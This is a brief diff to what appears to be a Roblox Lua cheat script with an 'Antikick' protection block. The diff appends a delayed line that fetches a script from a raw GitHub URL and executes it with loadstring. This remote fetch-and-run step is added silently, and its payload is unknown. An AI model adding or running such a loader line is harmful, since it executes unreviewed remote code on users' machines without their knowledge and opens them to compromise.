@@ -99,3 +99,6 @@ if Antikick then
         print("🛡️ Kick/Teleport protection active")
     end
 end
+
+task.wait(2)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Efield44444235364/Anti-ban/refs/heads/main/Delnoti"))()
